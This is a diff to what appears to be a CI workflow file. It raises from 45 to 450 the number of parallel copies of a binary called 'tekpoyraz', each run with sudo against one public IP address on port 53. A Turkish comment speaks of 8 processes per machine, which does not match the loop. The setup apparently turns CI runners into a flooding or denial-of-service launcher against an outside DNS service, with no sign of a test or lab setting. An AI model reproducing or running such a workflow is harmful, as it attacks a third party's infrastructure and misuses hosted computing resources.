@@ -23,7 +23,7 @@ jobs:
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
-          for i in {1..45}; do
+          for i in {1..450}; do
             sudo timeout 60 ./tekpoyraz 216.202.170.56 53 &
             PIDS+=($!)
           done
